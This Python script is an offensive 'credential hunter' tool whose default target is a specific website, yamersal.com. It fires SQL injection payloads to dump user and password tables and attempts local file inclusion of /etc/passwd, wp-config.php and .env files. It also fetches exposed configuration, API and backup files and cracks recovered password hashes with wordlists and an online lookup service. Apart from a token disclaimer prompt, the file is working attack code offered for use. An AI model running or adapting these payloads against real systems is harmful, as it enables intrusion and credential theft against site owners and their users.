#!/usr/bin/env python3
"""
Yamersal Credential Hunter v2.3
Advanced Credential Extraction Tool with Hash Cracking
Author: Security Researcher
Version: 2.3 - Hash Cracking Added
"""

import requests
import json
import urllib.parse
import re
import time
import sys
import os
import hashlib
import threading
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

class HashCracker:
    def __init__(self):
        self.hash_types = {
            'md5': {'pattern': r'^[a-fA-F0-9]{32}$', 'function': hashlib.md5},
            'sha1': {'pattern': r'^[a-fA-F0-9]{40}$', 'function': hashlib.sha1},
            'sha256': {'pattern': r'^[a-fA-F0-9]{64}$', 'function': hashlib.sha256},
            'sha512': {'pattern': r'^[a-fA-F0-9]{128}$', 'function': hashlib.sha512},
            'mysql': {'pattern': r'^[a-fA-F0-9]{16}$', 'function': None},
        }
        
        # Common wordlists
        self.wordlists = [
            '/usr/share/wordlists/rockyou.txt',
            '/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt',
            '/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt',
            'wordlists/common_passwords.txt'
        ]
        
        self.found_passwords = {}
        self.lock = Lock()

    def identify_hash_type(self, hash_string):
        """Identify the type of hash"""
        for hash_type, info in self.hash_types.items():
            if re.match(info['pattern'], hash_string):
                return hash_type
        return 'unknown'

    def try_online_lookup(self, hash_string, hash_type):
        """Try online hash lookup services"""
        try:
            if hash_type == 'md5':
                url = f"https://md5decrypt.net/api/api.php?hash={hash_string}&hash_type=md5&email=deanna_abshire@proxymail.eu&code=1152464b80a61737"
                response = requests.get(url, timeout=10)
                if response.text and response.text != hash_string:
                    return response.text
        except:
            pass
        return None

    def crack_hash(self, hash_string, wordlist_path=None, max_workers=4):
        """Crack hash using wordlist"""
        hash_type = self.identify_hash_type(hash_string)
        
        if hash_type == 'unknown':
            return None, 'unknown'
        
        # Try online lookup first
        self.print_status(f"   🔍 Identifying hash type: {hash_type}", "INFO")
        online_result = self.try_online_lookup(hash_string, hash_type)
        if online_result:
            return online_result, hash_type
        
        # Try built-in common passwords
        common_passwords = [
            '123456', 'password', '12345678', 'qwerty', '123456789',
            '12345', '1234', '111111', '1234567', 'dragon',
            '123123', 'admin', 'welcome', 'monkey', 'password1',
            '1234567890', 'abcd1234', 'sunshine', 'princess', 'qwertyuiop'
        ]
        
        for password in common_passwords:
            if self.verify_hash(password, hash_string, hash_type):
                return password, hash_type
        
        # Use wordlist if provided
        if wordlist_path and os.path.exists(wordlist_path):
            return self.crack_with_wordlist(hash_string, hash_type, wordlist_path, max_workers)
        
        # Try to find available wordlists
        for wordlist in self.wordlists:
            if os.path.exists(wordlist):
                result = self.crack_with_wordlist(hash_string, hash_type, wordlist, max_workers)
                if result[0]:
                    return result
        
        return None, hash_type

    def crack_with_wordlist(self, hash_string, hash_type, wordlist_path, max_workers):
        """Crack hash using wordlist with threading"""
        try:
            self.print_status(f"   📖 Using wordlist: {os.path.basename(wordlist_path)}", "INFO")
            
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                results = list(executor.map(
                    lambda pwd: (pwd, self.verify_hash(pwd, hash_string, hash_type)),
                    passwords
                ))
            
            for password, matched in results:
                if matched:
                    return password, hash_type
                    
        except Exception as e:
            self.print_status(f"   ❌ Wordlist error: {e}", "ERROR")
        
        return None, hash_type

    def verify_hash(self, password, hash_string, hash_type):
        """Verify if password matches hash"""
        try:
            if hash_type in self.hash_types and self.hash_types[hash_type]['function']:
                hash_obj = self.hash_types[hash_type]['function']()
                hash_obj.update(password.encode('utf-8'))
                return hash_obj.hexdigest() == hash_string.lower()
        except:
            pass
        return False

    def print_status(self, message, level="INFO"):
        """Print colored status messages"""
        colors = {
            "INFO": "\033[94m",
            "SUCCESS": "\033[92m", 
            "WARNING": "\033[93m",
            "ERROR": "\033[91m",
            "CRITICAL": "\033[95m"
        }
        reset = "\033[0m"
        icons = {
            "INFO": "[*]",
            "SUCCESS": "[+]", 
            "WARNING": "[!]",
            "ERROR": "[-]",
            "CRITICAL": "[!]"
        }
        print(f"{colors.get(level, '')}{icons.get(level, '')} {message}{reset}")

class CredentialHunter:
    def __init__(self, target="https://yamersal.com"):
        self.target = target
        self.session = requests.Session()
        self.hash_cracker = HashCracker()
        self.credentials_found = []
        self.vulnerable_endpoints = []
        
        # Configure session headers
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        })

    def print_status(self, message, level="INFO"):
        """Print colored status messages"""
        colors = {
            "INFO": "\033[94m",
            "SUCCESS": "\033[92m", 
            "WARNING": "\033[93m",
            "ERROR": "\033[91m",
            "CRITICAL": "\033[95m"
        }
        reset = "\033[0m"
        icons = {
            "INFO": "[*]",
            "SUCCESS": "[+]", 
            "WARNING": "[!]",
            "ERROR": "[-]",
            "CRITICAL": "[!]"
        }
        print(f"{colors.get(level, '')}{icons.get(level, '')} {message}{reset}")

    def test_connection(self):
        """Test if target is accessible"""
        try:
            response = self.session.get(self.target, timeout=10)
            if response.status_code == 200:
                self.print_status(f"Target is accessible: {self.target}", "SUCCESS")
                return True
            else:
                self.print_status(f"Target responded with status: {response.status_code}", "WARNING")
                return True
        except Exception as e:
            self.print_status(f"Target is not accessible: {e}", "ERROR")
            return False

    def crack_hashes_found(self, sql_results):
        """Crack hashes found during SQL injection"""
        cracked_hashes = []
        
        for result in sql_results:
            for finding in result['findings']:
                if "Hash:" in finding:
                    hash_value = finding.replace("Hash:", "").strip()
                    self.print_status(f"🔓 Attempting to crack hash: {hash_value}", "INFO")
                    
                    # Crack the hash
                    password, hash_type = self.hash_cracker.crack_hash(hash_value)
                    
                    hash_info = {
                        'hash': hash_value,
                        'type': hash_type,
                        'cracked': False,
                        'password': None,
                        'url': result['url']
                    }
                    
                    if password:
                        hash_info['cracked'] = True
                        hash_info['password'] = password
                        self.print_status(f"   ✅ CRACKED: {hash_value} -> {password} ({hash_type})", "CRITICAL")
                    else:
                        self.print_status(f"   ❌ Failed to crack: {hash_value} ({hash_type})", "WARNING")
                    
                    cracked_hashes.append(hash_info)
        
        return cracked_hashes

    def extract_from_sql_injection(self):
        """Extract credentials using SQL Injection - ORGANIZED OUTPUT"""
        self.print_status("Attempting SQL Injection credential extraction...", "INFO")
        
        sql_payloads = [
            "' UNION SELECT user_login,user_pass,user_email FROM wp_users--",
            "' UNION SELECT username,password,email FROM users--", 
            "' UNION SELECT username,password,email FROM admin_users--"
        ]
        
        parameters = ['id', 'page', 'file', 'path', 'view']
        found_credentials = []
        
        for param in parameters:
            self.print_status(f"Testing parameter: {param}", "INFO")
            for payload in sql_payloads:
                try:
                    test_url = f"{self.target}?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=10)
                    
                    if response.status_code == 200:
                        content = response.text
                        
                        # البحث عن أنماط محددة
                        if any(indicator in content.lower() for indicator in ['admin', 'user', 'password', 'email', 'username']):
                            
                            credential_data = {
                                'parameter': param,
                                'payload': payload,
                                'url': test_url,
                                'findings': []
                            }
                            
                            # استخراج أسماء المستخدمين
                            username_match = re.search(r'(admin|user|username)[^<>\n]*?([a-zA-Z0-9_@\.-]+)', content, re.IGNORECASE)
                            email_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', content)
                            hash_match = re.search(r'([a-fA-F0-9]{32,128})', content)  # Updated to catch longer hashes
                            
                            if username_match:
                                username = username_match.group(2) if username_match.group(2) else username_match.group(1)
                                if len(username) > 2:  # تجنب النتائج القصيرة
                                    credential_data['findings'].append(f"Username: {username}")
                                    self.print_status(f"   ✅ Found username: {username}", "SUCCESS")
                            
                            if email_match and len(email_match.group(1)) > 5:
                                credential_data['findings'].append(f"Email: {email_match.group(1)}")
                                self.print_status(f"   ✅ Found email: {email_match.group(1)}", "SUCCESS")
                            
                            if hash_match:
                                credential_data['findings'].append(f"Hash: {hash_match.group(1)}")
                                self.print_status(f"   ✅ Found hash: {hash_match.group(1)}", "SUCCESS")
                            
                            if credential_data['findings']:
                                found_credentials.append(credential_data)
                                self.print_status(f"   🔗 URL: {test_url}", "INFO")
                                
                except Exception as e:
                    continue
    
        # طباعة ملخص منظم لـ SQL Injection
        if found_credentials:
            self.print_status("\n" + "="*70, "INFO")
            self.print_status("🎯 SQL INJECTION RESULTS SUMMARY", "SUCCESS")
            self.print_status("="*70, "INFO")
            
            for i, cred in enumerate(found_credentials, 1):
                self.print_status(f"\n[{i}] Parameter: {cred['parameter']}", "INFO")
                self.print_status(f"   URL: {cred['url']}", "INFO")
                for finding in cred['findings']:
                    if "Username:" in finding:
                        self.print_status(f"   👤 {finding}", "SUCCESS")
                    elif "Email:" in finding:
                        self.print_status(f"   📧 {finding}", "SUCCESS")
                    elif "Hash:" in finding:
                        self.print_status(f"   🔑 {finding}", "CRITICAL")
            
            # فك تشفير الهاشات المكتشفة
            self.print_status("\n" + "="*70, "INFO")
            self.print_status("🔓 HASH CRACKING RESULTS", "CRITICAL")
            self.print_status("="*70, "INFO")
            
            cracked_hashes = self.crack_hashes_found(found_credentials)
            
            if cracked_hashes:
                for i, hash_info in enumerate(cracked_hashes, 1):
                    if hash_info['cracked']:
                        self.print_status(f"\n[{i}] ✅ CRACKED HASH: {hash_info['hash']}", "SUCCESS")
                        self.print_status(f"    🔓 Password: {hash_info['password']}", "CRITICAL")
                        self.print_status(f"    📝 Type: {hash_info['type']}", "INFO")
                        self.print_status(f"    🔗 Source: {hash_info['url']}", "INFO")
                    else:
                        self.print_status(f"\n[{i}] ❌ UNCRACKED HASH: {hash_info['hash']}", "WARNING")
                        self.print_status(f"    📝 Type: {hash_info['type']}", "INFO")
            
            # إضافة الهاشات المفكوكة للنتائج
            for cred in found_credentials:
                cred['cracked_hashes'] = [h for h in cracked_hashes if h['url'] == cred['url']]
        
        return found_credentials

    def extract_from_config_files(self):
        """Extract credentials from exposed configuration files - ORGANIZED OUTPUT"""
        self.print_status("Scanning for exposed configuration files...", "INFO")
        
        config_files = [
            '/.env', '/wp-config.php', '/config.php',
            '/.aws/credentials', '/web.config', '/appsettings.json'
        ]
        
        found_configs = []
        
        for config_file in config_files:
            try:
                url = f"{self.target}{config_file}"
                response = self.session.get(url, timeout=8)
                
                if response.status_code == 200:
                    content = response.text
                    config_data = {
                        'file': config_file,
                        'url': url,
                        'credentials': []
                    }
                    
                    self.print_status(f"✅ Config File Found: {config_file}", "SUCCESS")
                    self.print_status(f"   🔗 URL: {url}", "INFO")
                    
                    # البحث عن بيانات حساسة
                    patterns = {
                        'DB_USER': r"DB_USERNAME['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]",
                        'DB_PASSWORD': r"DB_PASSWORD['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]",
                        'DB_NAME': r"DB_NAME['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]",
                        'DB_HOST': r"DB_HOST['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]",
                        'API_KEY': r"API_KEY['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]",
                        'SECRET_KEY': r"SECRET_KEY['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]"
                    }
                    
                    for key, pattern in patterns.items():
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        for match in matches:
                            if match and len(match) > 3:
                                config_data['credentials'].append(f"{key}: {match}")
                                self.print_status(f"   🔑 {key}: {match}", "CRITICAL")
                    
                    if config_data['credentials']:
                        found_configs.append(config_data)
                        
            except Exception as e:
                continue
        
        # طباعة ملخص ملفات التكوين
        if found_configs:
            self.print_status("\n" + "="*70, "INFO")
            self.print_status("🎯 CONFIG FILES SUMMARY", "SUCCESS")
            self.print_status("="*70, "INFO")
            
            for config in found_configs:
                self.print_status(f"\n📁 File: {config['file']}", "INFO")
                self.print_status(f"🔗 URL: {config['url']}", "INFO")
                for cred in config['credentials']:
                    self.print_status(f"   {cred}", "CRITICAL")
        
        return found_configs

    def extract_from_exposed_apis(self):
        """Extract credentials from exposed API endpoints - ORGANIZED OUTPUT"""
        self.print_status("Scanning exposed API endpoints for credentials...", "INFO")
        
        api_endpoints = [
            '/wp-json/wp/v2/users',
            '/api/users', 
            '/api/admin/list',
            '/admin/api/accounts'
        ]
        
        found_apis = []
        
        for endpoint in api_endpoints:
            try:
                url = f"{self.target}{endpoint}"
                response = self.session.get(url, timeout=8)
                
                if response.status_code == 200:
                    api_data = {
                        'endpoint': endpoint,
                        'url': url,
                        'users': []
                    }
                    
                    self.print_status(f"✅ API Endpoint Found: {endpoint}", "SUCCESS")
                    self.print_status(f"   🔗 URL: {url}", "INFO")
                    
                    try:
                        data = response.json()
                        if isinstance(data, list):
                            for user in data[:5]:  # عرض أول 5 مستخدمين فقط
                                username = user.get('username') or user.get('user_login') or user.get('name')
                                email = user.get('email')
                                if username and len(username) > 2:
                                    user_info = f"👤 {username}"
                                    if email:
                                        user_info += f" | 📧 {email}"
                                    api_data['users'].append(user_info)
                                    self.print_status(f"   {user_info}", "SUCCESS")
                    except:
                        # البحث في النص العادي
                        users = re.findall(r'"username":\s*"([^"]+)"', response.text)
                        emails = re.findall(r'"email":\s*"([^"]+)"', response.text)
                        
                        for i, user in enumerate(users[:5]):
                            user_info = f"👤 {user}"
                            if i < len(emails):
                                user_info += f" | 📧 {emails[i]}"
                            api_data['users'].append(user_info)
                            self.print_status(f"   {user_info}", "SUCCESS")
                    
                    if api_data['users']:
                        found_apis.append(api_data)
                        
            except Exception as e:
                continue
        
        # طباعة ملخص الـ APIs
        if found_apis:
            self.print_status("\n" + "="*70, "INFO")
            self.print_status("🎯 EXPOSED APIS SUMMARY", "SUCCESS")
            self.print_status("="*70, "INFO")
            
            for api in found_apis:
                self.print_status(f"\n🌐 Endpoint: {api['endpoint']}", "INFO")
                self.print_status(f"🔗 URL: {api['url']}", "INFO")
                for user in api['users']:
                    self.print_status(f"   {user}", "SUCCESS")
        
        return found_apis

    def extract_from_backup_files(self):
        """Extract credentials from backup files - ORGANIZED OUTPUT"""
        self.print_status("Searching for backup files...", "INFO")
        
        backup_files = [
            '/backup.zip', '/dump.sql', '/database.sql',
            '/backup.sql', '/backup.tar.gz'
        ]
        
        found_backups = []
        
        for backup_file in backup_files:
            try:
                url = f"{self.target}{backup_file}"
                response = self.session.get(url, timeout=10)
                
                if response.status_code == 200:
                    self.print_status(f"✅ Backup File Found: {backup_file}", "SUCCESS")
                    self.print_status(f"   🔗 URL: {url}", "INFO")
                    self.print_status(f"   📦 File Size: {len(response.content)} bytes", "INFO")
                    
                    found_backups.append({
                        'file': backup_file,
                        'url': url,
                        'size': len(response.content)
                    })
                        
            except Exception as e:
                continue
        
        # طباعة ملخص ملفات النسخ الاحتياطي
        if found_backups:
            self.print_status("\n" + "="*70, "INFO")
            self.print_status("🎯 BACKUP FILES SUMMARY", "SUCCESS")
            self.print_status("="*70, "INFO")
            
            for backup in found_backups:
                self.print_status(f"\n📦 File: {backup['file']}", "INFO")
                self.print_status(f"🔗 URL: {backup['url']}", "INFO")
                self.print_status(f"💾 Size: {backup['size']} bytes", "INFO")
        
        return found_backups

    def extract_from_lfi(self):
        """Extract credentials via LFI vulnerabilities - ORGANIZED OUTPUT"""
        self.print_status("Attempting LFI credential extraction...", "INFO")
        
        sensitive_files = [
            '/etc/passwd',
            '../../wp-config.php', 
            '/var/www/html/.env',
            '/var/www/html/config.php'
        ]
        
        parameters = ['file', 'path', 'load', 'page']
        found_lfi = []
        
        for param in parameters:
            self.print_status(f"Testing LFI with parameter: {param}", "INFO")
            for file_path in sensitive_files:
                try:
                    test_url = f"{self.target}?{param}={urllib.parse.quote(file_path)}"
                    response = self.session.get(test_url, timeout=8)
                    
                    if response.status_code == 200:
                        content = response.text
                        lfi_data = {
                            'parameter': param,
                            'file': file_path,
                            'url': test_url,
                            'findings': []
                        }
                        
                        # التحقق من نجاح LFI
                        if 'wp-config' in file_path and ('DB_PASSWORD' in content or 'DB_USER' in content):
                            lfi_data['findings'].append("WordPress configuration exposed")
                            self.print_status(f"   ✅ LFI Success: {file_path}", "CRITICAL")
                            self.print_status(f"   🔗 URL: {test_url}", "INFO")
                            
                        elif '/etc/passwd' in file_path and 'root:' in content:
                            lfi_data['findings'].append("System passwd file exposed")
                            self.print_status(f"   ✅ LFI Success: {file_path}", "CRITICAL")
                            self.print_status(f"   🔗 URL: {test_url}", "INFO")
                            
                        elif '.env' in file_path and ('DB_PASSWORD' in content or 'API_KEY' in content):
                            lfi_data['findings'].append("Environment file exposed")
                            self.print_status(f"   ✅ LFI Success: {file_path}", "CRITICAL")
                            self.print_status(f"   🔗 URL: {test_url}", "INFO")
                        
                        if lfi_data['findings']:
                            found_lfi.append(lfi_data)
                            
                except Exception as e:
                    continue
        
        # طباعة ملخص LFI
        if found_lfi:
            self.print_status("\n" + "="*70, "INFO")
            self.print_status("🎯 LFI VULNERABILITIES SUMMARY", "SUCCESS")
            self.print_status("="*70, "INFO")
            
            for lfi in found_lfi:
                self.print_status(f"\n📁 File: {lfi['file']}", "INFO")
                self.print_status(f"🔗 URL: {lfi['url']}", "INFO")
                for finding in lfi['findings']:
                    self.print_status(f"   ✅ {finding}", "CRITICAL")
        
        return found_lfi

    def run_comprehensive_scan(self):
        """Run comprehensive scan with organized output"""
        self.print_status("Starting organized credential extraction scan...", "CRITICAL")
        
        if not self.test_connection():
            return
        
        self.print_status("\n" + "="*80, "INFO")
        self.print_status("🚀 CREDENTIAL HUNTING SCAN STARTED", "CRITICAL")
        self.print_status("="*80, "INFO")
        
        # تشغيل جميع الفحوصات
        sql_results = self.extract_from_sql_injection()
        config_results = self.extract_from_config_files()
        api_results = self.extract_from_exposed_apis()
        backup_results = self.extract_from_backup_files()
        lfi_results = self.extract_from_lfi()
        
        # جمع جميع النتائج
        all_results = {
            'sql_injection': sql_results,
            'config_files': config_results,
            'exposed_apis': api_results,
            'backup_files': backup_results,
            'lfi_vulnerabilities': lfi_results
        }
        
        # الملخص النهائي
        self.print_status("\n" + "="*80, "INFO")
        self.print_status("📊 SCAN COMPLETED - FINAL SUMMARY", "SUCCESS")
        self.print_status("="*80, "INFO")
        
        total_findings = len(sql_results) + len(config_results) + len(api_results) + len(backup_results) + len(lfi_results)
        
        self.print_status(f"✅ SQL Injection: {len(sql_results)} vulnerable parameters", "SUCCESS")
        self.print_status(f"✅ Config Files: {len(config_results)} exposed files", "SUCCESS")
        self.print_status(f"✅ API Endpoints: {len(api_results)} exposed APIs", "SUCCESS")
        self.print_status(f"✅ Backup Files: {len(backup_results)} found", "SUCCESS")
        self.print_status(f"✅ LFI Vulnerabilities: {len(lfi_results)} found", "SUCCESS")
        self.print_status(f"🎯 TOTAL VULNERABILITIES FOUND: {total_findings}", "CRITICAL")
        
        if total_findings > 0:
            self.print_status(f"🚨 SECURITY WARNING: {total_findings} vulnerabilities detected!", "CRITICAL")
        else:
            self.print_status("🛡️  No critical vulnerabilities detected", "SUCCESS")
        
        self.generate_report(all_results)

    def generate_report(self, results):
        """Generate comprehensive report"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"credential_hunter_report_{timestamp}.json"
        
        report = {
            'target': self.target,
            'scan_timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'results': results,
            'summary': {
                'total_vulnerabilities': sum(len(v) for v in results.values()),
                'vulnerability_types': {k: len(v) for k, v in results.items()}
            }
        }
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=4, ensure_ascii=False)
            self.print_status(f"\n💾 Detailed report saved to: {filename}", "SUCCESS")
        except Exception as e:
            self.print_status(f"❌ Failed to save report: {e}", "ERROR")

def main():
    """Main function"""
    banner = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                         CREDENTIAL HUNTER v2.3                              ║
║               Advanced Credential Extraction with Hash Cracking             ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """
    print(banner)
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = input("Enter target URL (default: https://yamersal.com): ").strip()
        if not target:
            target = "https://yamersal.com"
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    print(f"\n⚠️  LEGAL DISCLAIMER: This tool is for authorized penetration testing only!")
    print(f"⚠️  Unauthorized use may be illegal in your jurisdiction!")
    print(f"⚠️  Use only on systems you own or have explicit permission to test!\n")
    
    confirm = input("Do you have authorization to test this target? (y/n): ").lower()
    if confirm != 'y':
        print("Operation cancelled. Exiting...")
        sys.exit(0)
    
    try:
        hunter = CredentialHunter(target)
        hunter.run_comprehensive_scan()
        
    except KeyboardInterrupt:
        print("\nScan interrupted by user. Exiting...")
    except Exception as e:
        print(f"\nScan failed with error: {e}")

if __name__ == "__main__":
    main()